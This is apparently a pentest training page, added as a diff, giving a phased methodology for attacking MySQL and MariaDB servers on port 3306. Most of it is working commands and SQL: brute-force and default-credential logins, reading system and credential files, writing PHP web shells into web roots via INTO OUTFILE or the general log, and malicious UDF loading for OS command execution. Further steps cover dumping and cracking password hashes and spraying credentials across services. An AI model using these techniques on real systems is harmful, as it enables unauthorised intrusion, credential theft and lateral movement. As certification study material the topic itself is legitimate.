@@ -1,0 +1,477 @@
+---
+title: MySQL - Port 3306
+description: Enumeration and attack methodology for MySQL and MariaDB on port 3306, covering empty-password access, default credentials, file read/write to RCE, UDF execution, and hash harvesting.
+openGraph:
+  title: "MySQL - Port 3306"
+  description: "Enumeration and attack methodology for MySQL and MariaDB on port 3306, covering empty-password access, default credentials, file read/write to RCE, UDF execution, and hash harvesting."
+  images:
+    - url: /imgs/mysql.jpg
+      width: 1672
+      height: 941
+      alt: MySQL - Port 3306
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "MySQL - Port 3306"
+  description: "Enumeration and attack methodology for MySQL and MariaDB on port 3306, covering empty-password access, default credentials, file read/write to RCE, UDF execution, and hash harvesting."
+  images:
+    - url: /imgs/mysql.jpg
+      width: 1672
+      height: 941
+      alt: MySQL - Port 3306
+      type: image/jpeg
+---
+
+# MySQL - Port 3306
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+# Nmap
+nmap -sV -sC -p3306 <IP>
+nmap --script mysql* -p3306 <IP>
+
+# interatcion
+mysql -u root -p -h <IP> # -e to execute queries
+
+#enum 
+show variables like '%version%'; # detailed info
+show databases; # list databases
+use <database>; # use database
+show tables; # list tables
+descrube <table>; # describe table
+select * from <table>; # select all from table
+
+
+# Qucik dumping
+mysqldump -u root -p'<PASS>' -h <IP> --all-databases > dump.sql
+
+# Hydra brute force (last resort)
+hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> mysql
+
+# Read file (requires FILE privilege + permissive secure_file_priv)
+SELECT LOAD_FILE('/etc/passwd');
+
+# Write web shell (requires FILE privilege + writable web root)
+SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+# Check file operation restrictions
+mysql -u root -p'<PASS>' -h <IP> -e "SHOW VARIABLES LIKE 'secure_file_priv';"
+
+# Crack hashes
+hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+## Methodology
+
+### Phase 1: Fingerprint and Version Check
+
+<Callout type="default" emoji="?">
+  **ask yourself**
+
+  - Is this MySQL or MariaDB, and what exact build is running?
+  - Does the anonymous/empty-login flag show up in NSE output?
+  - Which auth plugin is in use (`mysql_native_password`, `caching_sha2_password`, `unix_socket`)?
+  - Are there version-specific CVEs whose prerequisites match?
+  - Is the server bound to all interfaces, or only reachable because of a misconfiguration?
+</Callout>
+
+```bash
+# Service detection + default NSE
+nmap -sV -sC -p3306 <IP>
+
+# Detailed server metadata (version, protocol, salt)
+nmap --script mysql-info -p3306 <IP>
+
+# Local exploit lookup
+searchsploit mysql <version>
+searchsploit mariadb <version>
+```
+
+- [ ] `nmap -sV -sC -p3306 <IP>` detect MySQL/MariaDB, version, and the empty-login flag. Default NSE also reports protocol version and capability flags.
+- [ ] `nmap --script mysql-info -p3306 <IP>` pull thread ID and salt. Distinguish MySQL from MariaDB: they share a wire protocol but diverge in auth plugins, defaults, and CVEs (`unix_socket` auth is MariaDB-specific and changes local root login behavior).
+- [ ] `searchsploit mysql <version>` note the exact build. `8.0.21` vs `8.0.35` is the difference between vulnerable and hardened, so be patch-level precise.
+- [ ] Check for CVE-2012-2122 on legacy 5.1/5.5/5.6 and MariaDB 5.1–5.3 builds a `memcmp` race where ~1 in 256 wrong-password attempts authenticates.
+
+### Phase 2: No-Password / Empty Password Access
+
+<Callout type="default" emoji="?">
+  **ask yourself**
+
+  - Does `root` (or another account) accept a blank password?
+  - Is access remote because `bind-address = 0.0.0.0`, or is `skip-grant-tables` disabling auth entirely?
+  - Is anonymous access enabled, or is any host allowed to connect (`user@'%'`)?
+  - If I get in, what do `SHOW GRANTS` and `secure_file_priv` tell me about the available primitives?
+  - Which accounts beyond `root` are worth trying with no password?
+</Callout>
+
+```bash
+# Root with no password (highest-ROI check on MySQL)
+mysql -u root -h <IP>
+nxc mysql <IP> -u root -p '' # automated equivalent with clean output
+nmap --script mysql-empty-password -p3306 <IP>
+```
+
+- [ ] `mysql -u root -h <IP>` try root with no password. This is the single highest-ROI check; do it first every time. Misconfigured auth (anonymous access, a user with no password, or any host allowed to connect) can let you in without a valid credential.
+- [ ] `nxc mysql <IP> -u root -p ''` automated equivalent with clean output; `nmap --script mysql-empty-password -p3306 <IP>` as a second opinion.
+- [ ] Try other common accounts with no password: `admin`, `mysql`, `dbadmin`, `test`, `guest`.
+- [ ] If access is granted, immediately run `SHOW GRANTS;` (look for `FILE`, `SUPER`, `GRANT OPTION`) and `SHOW VARIABLES LIKE 'secure_file_priv';` (empty `""` = RCE path open) these decide whether Phase 5/6 are viable.
+
+### Phase 3: Default Credentials, Reuse, and Brute Force
+
+<Callout type="default" emoji="?">
+  **ask yourself**
+
+  - Which credentials have already been harvested from web configs (`wp-config.php`, `.env`, `config.php`) or other services?
+  - Are there MySQL-specific default pairs that fit this deployment (LAMP stack, appliance, IoT)?
+  - Have credential reuse and targeted defaults been exhausted before brute force?
+  - What lockout/host-block controls (`max_connect_errors`) apply, and what is the OPSEC cost of spraying?
+</Callout>
+
+```bash
+# Single credential check
+nxc mysql <IP> -u <USER> -p '<PASS>'
+
+# Spray harvested creds first
+nxc mysql <IP> -u users.txt -p passwords.txt
+
+# Brute force last resort, targeted list preferred over rockyou
+hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> mysql
+medusa -h <IP> -U users.txt -P passwords.txt -M mysql
+```
+
+- [ ] Try defaults systematically: `root:root`, `root:toor`, `root:password`, `root:mysql`, `admin:admin`, `mysql:mysql`, `test:test`, `dbadmin:dbadmin`, `wordpress:wordpress`.
+- [ ] Grep web app configs first `wp-config.php`, `config.php`, `.env` are the richest source of MySQL credentials on any engagement, and DBAs reuse the DB password on SSH/SMB constantly.
+- [ ] `nxc mysql <IP> -u users.txt -p passwords.txt` spray harvested creds with clean output before any brute force.
+- [ ] `hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> mysql` only after reuse is exhausted. Narrow to 10–20 high-probability passwords to avoid tripping `max_connect_errors` (default 100) and getting host-blocked.
+
+### Phase 4: Post-Access Enumeration
+
+<Callout type="default" emoji="?">
+  **ask yourself**
+
+  - Who am I (`user()` vs `current_user()`), and what privileges do I actually hold?
+  - Do I have `FILE`, `SUPER`, or `PROCESS` the privileges that unlock file primitives, logging control, and query snooping?
+  - Which non-system databases hold application users, tokens, or API keys?
+  - Is `secure_file_priv` empty, restricted, or NULL and where is `plugin_dir`?
+</Callout>
+
+```sql
+-- Identity and privileges
+SELECT version(); SELECT user(); SELECT current_user(); SELECT @@hostname;
+SHOW GRANTS;
+
+-- Databases → tables → data (the core read/change workflow)
+SHOW DATABASES;
+USE <database>;
+SHOW TABLES;
+SELECT * FROM <table>;
+
+-- Users and hashes
+SELECT user, host, authentication_string FROM mysql.user;
+SELECT user, host, plugin FROM mysql.user;
+
+-- Credential-bearing columns across every database
+SELECT table_schema, table_name, column_name FROM information_schema.columns
+WHERE column_name LIKE '%pass%' OR column_name LIKE '%token%' OR column_name LIKE '%secret%';
+
+-- File-operation capability
+SHOW VARIABLES LIKE 'secure_file_priv';
+SHOW VARIABLES LIKE 'plugin_dir';
+SHOW VARIABLES LIKE 'datadir';
+```
+
+Once you have a session, the read/change workflow is always the same: identify the databases, list the tables in each, then read the contents of the interesting ones. A server can hold hundreds of tables, so target names that suggest credentials, tokens, configuration, or PII rather than dumping blindly. Attempting to list or `USE` a database you have no rights to returns an error, which is itself useful enumeration.
+
+- [ ] `SHOW GRANTS;` the critical privilege check. `FILE` enables Phase 5/6; `SUPER` lets you disable logging and change runtime variables; `PROCESS` lets you read other users' running queries (sometimes leaking credentials).
+- [ ] `SELECT user, host, authentication_string FROM mysql.user;` dump every hash for offline cracking and cross-service spraying.
+- [ ] `SELECT user, host, plugin FROM mysql.user;` `unix_socket`/`auth_socket` means OS identity is trusted (not crackable remotely); `mysql_native_password` is the crackable SHA1-based hash.
+- [ ] Enumerate each non-system database: `USE <database>; SHOW TABLES;` then grep names for `users`, `accounts`, `credentials`, `config`, `tokens`, `api_keys`, and `SELECT * FROM <table> LIMIT 20;` on anything interesting.
+- [ ] `SHOW VARIABLES LIKE 'secure_file_priv';` empty `""` = unrestricted file R/W; a path = restricted; `NULL` = file primitives dead. This decides whether you go to Phase 5 or Phase 6.
+
+### Phase 5: File Read/Write to RCE (Requires FILE Privilege)
+
+<Callout type="default" emoji="?">
+  **ask yourself**
+
+  - Is `FILE ON *.*` granted and is `secure_file_priv` permissive enough to reach a web root?
+  - Which high-value files can I read (web configs, `.env`, SSH keys, `debian.cnf`)?
+  - Does a web server share a directory the `mysql` user can write to?
+  - If `INTO OUTFILE` fails, is it a privilege issue or a directory-permission issue?
+</Callout>
+
+```sql
+-- Read high-value files (LOAD_FILE requires FILE privilege)
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/var/www/html/wp-config.php');
+SELECT LOAD_FILE('/var/www/html/.env');
+SELECT LOAD_FILE('/home/<USER>/.ssh/id_rsa');
+SELECT LOAD_FILE('/etc/mysql/debian.cnf');
+
+-- Write a PHP web shell (Linux)
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+-- Write a PHP web shell (Windows / IIS)
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.php';
+```
+
+MySQL has no `xp_cmdshell` equivalent, so command execution goes through the file system: write a script into a directory the web server (or another interpreter) will execute, then trigger it over HTTP. `LOAD_FILE`, `INTO OUTFILE`, and `LOAD DATA` are all gated by the `FILE` privilege and constrained by `secure_file_priv`.
+
+- [ ] Confirm `FILE ON *.*` in `SHOW GRANTS;` and re-check `secure_file_priv` empty `""` lets you read/write anywhere the `mysql` user can reach.
+- [ ] Read for credentials: `LOAD_FILE('/var/www/html/wp-config.php')` (DB creds + WP secrets), `.env` (Laravel/Node SMTP/S3/API/DB creds in one place), `/home/<USER>/.ssh/id_rsa` via ssh.
+- [ ] Write a web shell: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` then verify `curl http://<IP>/shell.php?cmd=id`. The shell runs as the web server user (`www-data`), not the MySQL user.
+- [ ] If `INTO OUTFILE` fails, distinguish the cause: an `Access denied` SQL error means no `FILE` privilege (go to Phase 7); a filesystem error means the target dir isn't writable by `mysql` read the Apache config (`LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')`) to find a writable `DocumentRoot`, or stage in `/tmp/` for use with an existing LFI.
+
+### Phase 6: UDF Execution (When File Write Is Blocked) (NOT FOR CPTS)
+
+<Callout type="default" emoji="?">
+  **ask yourself**
+
+  - Is `plugin_dir` writable via `INTO DUMPFILE` even though `INTO OUTFILE` to the web root is blocked?
+  - Does my UDF shared library match the server architecture (32- vs 64-bit) exactly?
+  - Is this MySQL 8.0+, where unsigned UDF loading is disabled by default and this path likely dies?
+  - Is there a quieter primitive (`general_log` to a PHP file) if I also hold `SUPER`?
+</Callout>
+
+```sql
+-- Find the plugin directory (the DUMPFILE target)
+SHOW VARIABLES LIKE 'plugin_dir';
+
+-- Drop the malicious library (binary-safe write)
+SELECT <hex_encoded_so> INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+
+-- Register and call the function
+CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
+SELECT sys_exec('id > /tmp/out');
+SELECT sys_eval('id');
+```
+
+MySQL supports User-Defined Functions (UDFs), which let a shared library expose C/C++ code as a callable SQL function. The public `lib_mysqludf_sys` library provides `sys_exec`/`sys_eval` for command execution. It is uncommon in production, but when present (or when you can write it yourself) it turns database access into OS command execution.
+
+- [ ] `SHOW VARIABLES LIKE 'plugin_dir';` confirm the path (e.g. `/usr/lib/mysql/plugin/`). `INTO DUMPFILE` to `plugin_dir` is a separate write path that sometimes bypasses a `secure_file_priv` web-root restriction.
+- [ ] Match architecture: use `raptor_udf2.c` (Linux) or a pre-compiled UDF DLL (Windows). The `.so`/`.dll` must match the MySQL server build exactly or `CREATE FUNCTION` fails.
+- [ ] Upload with `INTO DUMPFILE` (binary-safe; `INTO OUTFILE` corrupts binaries), register with `CREATE FUNCTION sys_exec ...`, then `SELECT sys_exec('id > /tmp/out');` / `SELECT sys_eval('id');` for command output.
+- [ ] If you hold `SUPER` but UDF is blocked, fall back to the `general_log` trick: `SET GLOBAL general_log = 'ON'; SET GLOBAL general_log_file = '/var/www/html/shell.php'; SELECT '<?php system($_GET["cmd"]); ?>';` every query now lands in a PHP file in the web root.
+
+### Phase 7: Credential Harvesting and Lateral Movement
+
+<Callout type="default" emoji="?">
+  **ask yourself**
+
+  - Which dumped hashes are crackable, and what hashcat mode matches the auth plugin?
+  - Do cracked or application-table passwords follow a pattern worth spraying as variations?
+  - Which other services and database servers should every recovered credential be sprayed against?
+  - Does any application credential unlock a web admin panel with a faster file-upload → RCE path?
+</Callout>
+
+```bash
+# Crack MySQL 4.1+/MariaDB (mysql_native_password, SHA1-based)
+hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Crack MySQL 8.0+ caching_sha2_password (SHA256-based, slower)
+hashcat -m 7401 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# John alternative
+john --format=mysql-sha1 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+- [ ] Crack dumped hashes with the matching mode: `-m 300` for `mysql_native_password`, `-m 7401` for `caching_sha2_password`.
+- [ ] Spray cracked passwords against every other service.
+- [ ] Extract application credentials from database tables web admin passwords stored here routinely unlock admin panels with file-upload → RCE vectors faster than any MySQL primitive.
+- [ ] Spray found credentials across the database estate (MySQL, MSSQL, PostgreSQL, Oracle) DBAs reuse passwords across databases more than any other population. If a password looks seasonal (`Summer2024!`), try variations (`Winter2024!`, `Spring2024!`) too.
+
+<Quiz
+  question="You have MySQL root access via an empty password. SHOW GRANTS shows ALL PRIVILEGES ON *.* WITH GRANT OPTION and secure_file_priv is empty. The target runs Apache on the same host. Your goal is a reverse shell. What's the most reliable sequence?"
+  options={[
+    "Upload a malicious UDF shared library and call sys_exec to spawn a reverse shell",
+    "Dump mysql.user hashes, crack root's password, SSH in with the same password",
+    "Write a PHP web shell via INTO OUTFILE to /var/www/html/shell.php, then trigger a reverse shell through the web shell",
+    "Enable general_log, set log_file to a PHP file in the web root, execute a SELECT with PHP code, then request the log"
+  ]}
+  answer={2}
+  explanation="UDF (A) works but is architecture-dependent, version-sensitive, and blocked on modern MySQL — high effort, high failure rate. Option B is speculative: the MySQL root password may not match OS root, and SSH root password auth is often disabled. Option D (general_log to PHP) is a real but fragile technique requiring precise permissions and surviving SQL escaping. Option C is the textbook path: INTO OUTFILE with empty secure_file_priv is the most reliable MySQL-to-RCE primitive there is one query lands a web shell, one curl confirms it. Save exotic techniques for when the simple path is blocked."
+/>
+
+## Overview
+
+MySQL is an open-source relational database management system that stores data in tables, columns, and rows and is queried with SQL. MariaDB is a community fork created after Oracle acquired MySQL; the two share a wire protocol and most of their SQL dialect, so from a pentest perspective they are largely interchangeable. Expect MySQL on LAMP-stack web servers and MariaDB as the default MySQL-compatible package on modern Linux distributions.
+
+Database hosts are high-value targets because they store credentials, PII, business data, and payment information, and they frequently run under highly privileged accounts. Access to the database is rarely the objective in itself it is a springboard for credential reuse, lateral movement, and privilege escalation.
+
+| Detail | Value |
+|--------|-------|
+| Port | 3306/TCP (default) |
+| Alternate | 33060/TCP (X Protocol MySQL 8.0+) |
+| Config (Debian/Ubuntu) | `/etc/mysql/mysql.conf.d/mysqld.cnf` |
+| Config (RHEL/CentOS) | `/etc/my.cnf` |
+| Data directory | `/var/lib/mysql/` |
+| Error log | `/var/log/mysql/error.log` |
+| Debian management creds | `/etc/mysql/debian.cnf` |
+
+**System databases:**
+
+| Database | Purpose |
+|----------|---------|
+| `mysql` | User accounts, privileges, and server-wide configuration |
+| `information_schema` | Metadata about every database, table, and column on the server |
+| `performance_schema` | Low-level runtime instrumentation and performance metrics |
+| `sys` | Simplified views built on `performance_schema` |
+
+## Authentication and Privileges
+
+MySQL supports several authentication methods username/password (the common case), OS-identity plugins (`unix_socket`/`auth_socket`), and even Windows authentication via a plugin. Administrators pick a mode for compatibility, security, or usability reasons, and each choice introduces its own misconfigurations: anonymous access, passwordless accounts, or accounts allowed from any host (`user@'%'`) all grant entry without a valid credential.
+
+What a login can actually do depends on its privileges. Depending on the grants, database access may let you:
+
+- Read or change database contents
+- Read or change the server configuration (`SET GLOBAL ...` with `SUPER`)
+- Read local files (`LOAD_FILE`, `FILE` privilege)
+- Write local files, leading to command execution (`INTO OUTFILE`/`INTO DUMPFILE`)
+- Execute OS commands via a User-Defined Function (`lib_mysqludf_sys`)
+- Read other users' running queries (`PROCESS`), sometimes leaking credentials
+- Reach other database servers whose credentials are reused here
+
+## Quick Reference
+
+```cheatsheet
+mysql -u root -p -h <IP>                               # Connect to MySQL as root
+nmap -sV -sC -p3306 <IP>                               # Scan for MySQL service/version with Nmap
+SHOW DATABASES;                                        # List all databases
+USE <database>;                                        # Switch to a specific database
+SHOW TABLES;                                           # List tables in the current database
+DESCRIBE <table>;                                      # Describe a table's columns
+mysqldump -u root -p -h <IP> --all-databases           # Dump all data from every database
+SELECT user();                                         # Show current logged-in user
+SHOW GRANTS;                                           # Display granted privileges for current user
+SELECT user, authentication_string FROM mysql.user;     # Dump user hashes from mysql.user
+SELECT LOAD_FILE('/etc/passwd');                       # Read a file from disk, if permitted
+SELECT 'data' INTO OUTFILE '/path/file';               # Write text to a file on disk
+SELECT <hex> INTO DUMPFILE '/path/file';               # Write binary data to a file (hex-encoded)
+SHOW VARIABLES LIKE 'secure_file_priv';                # Show OUTFILE/LOAD_FILE directory restriction
+```
+
+## SQL Syntax Reference
+
+The MySQL client executes on `;` (or `\g`). The read/change loop below is the backbone of post-access enumeration.
+
+```sql
+-- Show databases
+SHOW DATABASES;
+
+-- Select a database
+USE <database>;
+
+-- Show tables in the current database
+SHOW TABLES;
+
+-- Describe a table's columns, then read it
+DESCRIBE <table>;
+SELECT * FROM <table>;
+
+-- Server / identity info
+SELECT version();
+SELECT @@hostname;
+SELECT user();
+SELECT database();
+
+-- Find password columns across all databases
+SELECT table_schema, table_name, column_name
+FROM information_schema.columns
+WHERE column_name LIKE '%pass%';
+
+-- All non-system tables
+SELECT table_schema, table_name FROM information_schema.tables
+WHERE table_schema NOT IN ('information_schema', 'performance_schema', 'mysql', 'sys');
+
+-- Users, hashes, and auth plugin
+SELECT user, host FROM mysql.user;
+SELECT user, host, authentication_string FROM mysql.user;
+SELECT user, host, plugin FROM mysql.user;
+
+-- Privileges
+SHOW GRANTS;
+SHOW GRANTS FOR 'root'@'localhost';
+
+-- Security-relevant variables
+SHOW VARIABLES LIKE 'secure_file_priv';
+SHOW VARIABLES LIKE 'plugin_dir';
+SHOW VARIABLES LIKE 'datadir';
+SHOW VARIABLES LIKE 'general_log%';
+```
+
+## Nmap Scripts
+
+```bash
+# Targeted scripts
+nmap --script mysql-info -p3306 <IP>                  # Server version, protocol, capabilities, salt
+nmap --script mysql-enum -p3306 <IP>                  # Enumerate valid usernames via auth error timing
+nmap --script mysql-brute -p3306 <IP>                 # Brute force credentials
+nmap --script mysql-empty-password -p3306 <IP>        # Check for empty root password
+nmap --script mysql-databases --script-args mysqluser=root,mysqlpass=<PASS> -p3306 <IP>  # List databases (needs creds)
+nmap --script mysql-users --script-args mysqluser=root,mysqlpass=<PASS> -p3306 <IP>      # List users (needs creds)
+nmap --script mysql-dump-hashes --script-args username=root,password=<PASS> -p3306 <IP>  # Dump password hashes (needs creds)
+nmap --script mysql-vuln-cve2012-2122 -p3306 <IP>    # Auth bypass memcmp race condition (CVE-2012-2122)
+```
+
+## File Read / Write Details
+
+`LOAD_FILE`, `INTO OUTFILE`, `INTO DUMPFILE`, and `LOAD DATA` all require the `FILE` privilege and are constrained by the global `secure_file_priv` variable:
+
+| `secure_file_priv` value | Effect |
+|--------------------------|--------|
+| empty (`""`) | No restriction read/write anywhere the `mysql` user can reach (insecure, RCE-friendly) |
+| a directory path | Import/export limited to that directory; the directory must already exist |
+| `NULL` | Import/export disabled entirely  file primitives are dead |
+
+By default a stock MySQL install does not permit arbitrary file read; the `FILE` privilege plus a permissive `secure_file_priv` is what unlocks it. Confirm the value before relying on Phase 5.
+
+## Default Credentials
+
+| Username | Password | Notes |
+|----------|----------|-------|
+| `root` | (empty) | Most common try first |
+| `root` | `root` | Second most common |
+| `root` | `toor` | Kali / offensive distro default |
+| `root` | `password` | Generic default |
+| `root` | `mysql` | Service-specific |
+| `admin` | `admin` | Common web app DB user |
+| `mysql` | `mysql` | Service account |
+| `test` | `test` | Test account left in production |
+| `dbadmin` | `dbadmin` | Administrative account |
+| `wordpress` | `wordpress` | WP installer default |
+
+## Dangerous Settings
+
+**Config file:** `/etc/mysql/mysql.conf.d/mysqld.cnf` or `/etc/my.cnf`
+
+| Setting | Risk |
+|---------|------|
+| `bind-address = 0.0.0.0` | MySQL exposed to all interfaces remotely accessible |
+| `skip-grant-tables` | Authentication completely disabled anyone connecting is treated as root |
+| `secure_file_priv = ""` (empty) | Unrestricted file read/write via `LOAD_FILE` / `INTO OUTFILE` |
+| `local-infile = 1` | Client-side `LOAD DATA LOCAL INFILE` enabled attack surface for malicious clients |
+| `user = root` | MySQL daemon runs as system root file operations run as root |
+| `general_log = ON` with writable `general_log_file` | Query log can be repurposed to write PHP into the web root |
+
+<Callout type="warning">
+`skip-grant-tables` completely disables authentication. Any client connecting is treated as root with all privileges. It is normally a password-recovery boot flag but if you find it in a running config on a live server, the database is wide open to anyone who can reach port 3306.
+</Callout>
+
+## Hash Cracking
+
+```bash
+# Hashcat MySQL 4.1+ / MariaDB (mysql_native_password, SHA1-based)
+hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Hashcat MySQL 8.0+ caching_sha2_password
+hashcat -m 7401 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# John
+john --format=mysql-sha1 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #PenetrationTesting #RedTeam #Certification #Linux #Windows #MySQL #MariaDB #Database #ServiceEnum #UDF #FileRead #RCE #HashCracking #Nmap #SQLi
+</div>
